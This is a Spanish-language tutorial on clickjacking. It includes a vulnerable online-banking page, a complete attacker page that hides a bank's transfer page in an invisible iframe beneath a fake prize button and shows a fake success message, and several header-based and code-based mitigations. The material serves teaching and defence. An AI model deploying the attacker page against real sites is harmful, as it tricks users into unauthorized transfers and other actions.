# Vulnerabilidad de Clickjacking

## Descripción

El Clickjacking (también conocido como "ataque de redirección de UI" o "UI redress attack") es una técnica maliciosa en la que un atacante utiliza múltiples capas transparentes o semitransparentes para engañar a un usuario y hacer que haga clic en un botón o enlace en una página cuando tenía la intención de hacer clic en otra cosa en la página de nivel superior. Esencialmente, el atacante está "secuestrando" los clics destinados a una página y redirigiendo los clics a otra página, muy probablemente propiedad de otra aplicación, dominio o ambos.

## Detalles Técnicos

El clickjacking funciona cargando una página web maliciosa que contiene un iframe invisible que carga la página web objetivo. El atacante posiciona estratégicamente este iframe sobre contenido atractivo, engañando al usuario para que interactúe con lo que cree que es la página visible, mientras realmente está haciendo clic en elementos de la página vulnerable oculta.

## Ejemplos de Código Vulnerable

### HTML sin protecciones contra Clickjacking

```html
<!DOCTYPE html>
<html>
<head>
    <title>Página Vulnerable</title>
    <!-- Sin encabezados de protección X-Frame-Options -->
</head>
<body>
    <h1>Banca Online</h1>
    
    <!-- Botón que realiza una acción sensible -->
    <button onclick="realizarTransferencia()">
        Transferir Fondos
    </button>
    
    <script>
    function realizarTransferencia() {
        // Lógica para transferir dinero
        fetch('/api/transferir', {
            method: 'POST',
            body: JSON.stringify({
                destino: 'cuenta123',
                cantidad: 1000
            })
        });
    }
    </script>
</body>
</html>
```

### Código del Atacante

```html
<!DOCTYPE html>
<html>
<head>
    <title>¡Gana un Premio!</title>
    <style>
        /* Estilo para posicionar el iframe exactamente donde queremos */
        #victima {
            position: absolute;
            opacity: 0; /* Invisible para el usuario */
            z-index: 2;
            top: 0;
            left: 0;
            width: 800px;
            height: 500px;
            /* Desplazamos el iframe para alinear el botón de transferencia 
               con nuestro botón de "Reclamar Premio" */
            margin-top: -120px;
            margin-left: -50px;
            border: none;
            pointer-events: none; /* Permitimos que los clics pasen a través */
        }
        
        #capa-trampa {
            position: relative;
            z-index: 1;
            width: 300px;
            height: 300px;
            background-color: #f0f0f0;
            text-align: center;
            padding: 20px;
        }
        
        #boton-trampa {
            position: relative;
            pointer-events: none; /* Los clics pasan al iframe debajo */
            padding: 15px 30px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
            margin-top: 30px;
        }
        
        #area-clickeable {
            position: absolute;
            width: 200px;
            height: 50px;
            top: 140px;
            left: 50px;
            z-index: 3;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="capa-trampa">
        <h2>¡Felicidades!</h2>
        <p>Has sido seleccionado para recibir un premio especial.</p>
        
        <button id="boton-trampa">¡RECLAMAR PREMIO AHORA!</button>
        
        <!-- Área clickeable que está encima de todo -->
        <div id="area-clickeable"></div>
    </div>
    
    <!-- Iframe con la página víctima (invisible) -->
    <iframe id="victima" src="https://banco-vulnerable.com/transferencia"></iframe>
    
    <script>
        // Hacemos que el área clickeable permita que los clics lleguen al iframe
        document.getElementById('area-clickeable').addEventListener('click', function() {
            // El usuario cree que está haciendo clic en "RECLAMAR PREMIO"
            // pero en realidad está haciendo clic en el botón de transferencia
            // del iframe invisible
            document.getElementById('victima').style.pointerEvents = 'auto';
            
            // Después de un breve momento, volvemos a bloquear los clics
            setTimeout(function() {
                document.getElementById('victima').style.pointerEvents = 'none';
                
                // Mostramos un mensaje falso de éxito
                alert('¡Felicidades! Tu premio está en camino.');
            }, 100);
        });
    </script>
</body>
</html>
```

## Mitigaciones

### 1. Encabezado X-Frame-Options

El encabezado HTTP `X-Frame-Options` puede ser usado para indicar si un navegador debe permitir que una página sea renderizada en un `<frame>`, `<iframe>`, `<embed>` o `<object>`. Los sitios pueden usar esto para evitar ataques de clickjacking.

```
// En el servidor
response.setHeader('X-Frame-Options', 'DENY');  // No permite ningún iframe
// O
response.setHeader('X-Frame-Options', 'SAMEORIGIN');  // Solo permite iframes del mismo origen
```

### 2. Content Security Policy (CSP)

El uso de la directiva `frame-ancestors` en CSP proporciona más control granular y es el reemplazo a largo plazo de X-Frame-Options.

```
// En el servidor
response.setHeader(
  'Content-Security-Policy', 
  "frame-ancestors 'none';"  // No permite ningún iframe
);
// O
response.setHeader(
  'Content-Security-Policy', 
  "frame-ancestors 'self';"  // Solo permite iframes del mismo origen
);
// O
response.setHeader(
  'Content-Security-Policy', 
  "frame-ancestors 'self' https://trusted-site.com;"  // Permite iframes del mismo origen y de un dominio específico
);
```

### 3. Frame-busting JavaScript

Código JavaScript que intenta prevenir que una página sea cargada en un iframe. Esta técnica es menos efectiva ya que puede ser eludida:

```javascript
// En la página que quieres proteger
if (window.self !== window.top) {
  window.top.location.href = window.self.location.href;
}
```

### 4. SameSite Cookies

Configurar cookies como `SameSite=Strict` evita que sean enviadas en contextos de terceros, lo que puede ayudar a mitigar ataques CSRF que podrían complementar un ataque de clickjacking:

```
// En el servidor
response.setHeader(
  'Set-Cookie', 
  'session=123; SameSite=Strict; Secure; HttpOnly'
);
```

### 5. Autenticación Multi-paso

Para acciones sensibles, requerir una autenticación adicional o confirmación que sería difícil de engañar mediante clickjacking:

```javascript
function realizarTransferencia() {
  // Solicitar una segunda confirmación antes de completar la acción
  const codigo = prompt("Ingresa el código de verificación enviado a tu teléfono:");
  
  if (codigo) {
    fetch('/api/verificar-codigo', {
      method: 'POST',
      body: JSON.stringify({ codigo })
    })
    .then(response => response.json())
    .then(data => {
      if (data.valido) {
        // Proceder con la transferencia
        completarTransferencia();
      } else {
        alert("Código incorrecto. Transferencia cancelada.");
      }
    });
  }
}
```

## Impacto

Los ataques de clickjacking pueden tener varios impactos graves:

1. **Acciones no autorizadas**: Hacer que los usuarios realicen acciones sin su consentimiento, como transferencias bancarias o cambios en la configuración de seguridad.

2. **Robo de credenciales**: Engañar a los usuarios para que introduzcan información sensible que puede ser capturada por el atacante.

3. **Activación de permisos**: Conseguir que los usuarios activen permisos de cámara, micrófono o ubicación sin saberlo.

4. **Propagación de malware**: Engañar a los usuarios para que descarguen o instalen software malicioso.

5. **Manipulación social**: Hacer que los usuarios compartan o den "me gusta" a contenido en redes sociales sin su consentimiento.

## Conclusión

El clickjacking es un ataque particularmente engañoso porque explota la confianza del usuario en lo que ve en la pantalla. La defensa principal contra este tipo de ataques es impedir que tu página web sea cargada en iframes de otros sitios, lo cual se puede lograr efectivamente usando los encabezados HTTP adecuados. La combinación de X-Frame-Options, Content Security Policy y otras técnicas defensivas proporciona una protección en profundidad contra estos ataques.